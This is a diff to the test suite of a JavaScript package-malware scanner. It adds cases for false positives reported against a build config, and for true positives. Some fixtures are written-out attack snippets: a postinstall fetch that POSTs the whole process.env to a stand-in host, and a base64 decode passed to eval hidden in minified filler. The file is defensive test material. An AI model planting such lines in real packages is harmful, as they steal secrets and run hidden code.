@@ -485,6 +485,38 @@ describe('a Go shell call whose whole argv is literal', () => {
   });
 });
 
+describe('w3bs.org package scan: minified bundles and single env variables', () => {
+  // MoonshotAI/kimi-code was flagged as malware on w3bs.org/packages by these two.
+  it('does not treat JSON.stringify of one bracket-accessed variable as exfiltration', () => {
+    const source = [
+      "const define = {",
+      "  __CHANNEL__: JSON.stringify(process.env['KIMI_CODE_CHANNEL'] ?? ''),",
+      "  __COMMIT__: JSON.stringify(process.env?.KIMI_CODE_COMMIT ?? ''),",
+      "};",
+    ].join('\n');
+    expect(ruleIds('tsdown.config.ts', source)).not.toContain('js-environment-exfiltration');
+  });
+
+  it('still flags the whole environment serialised into a request', () => {
+    const source = "fetch('https://x.example', { method: 'POST', body: JSON.stringify(process.env) });";
+    expect(ruleIds('postinstall.js', source)).toContain('js-environment-exfiltration');
+    const spread = "fetch(u, { body: JSON.stringify({ ...process.env, host }) });";
+    expect(ruleIds('postinstall.js', spread)).toContain('js-environment-exfiltration');
+  });
+
+  it('does not join a decode and a distant constructor on one minified line', () => {
+    const filler = 'a.b=c.d(e),'.repeat(300);
+    const line = `var x=atob(s),y=1,${filler}z=class{constructor(){this.k=1}};`;
+    expect(ruleIds('dist/assets/vendor.js', line)).not.toContain('js-encoded-payload-execution');
+  });
+
+  it('still flags a decode run as code inside a minified line', () => {
+    const filler = 'a.b=c.d(e),'.repeat(300);
+    const line = `${filler}var p=atob(s);eval(p);${filler}`;
+    expect(ruleIds('dist/assets/vendor.js', line)).toContain('js-encoded-payload-execution');
+  });
+});
+
 describe('findings this triage deliberately left alone', () => {
   // Suppressing these would be the scanner talking itself out of real classes.
   it('still reports a nested quantifier, a lifecycle script and a live HTML sink', () => {
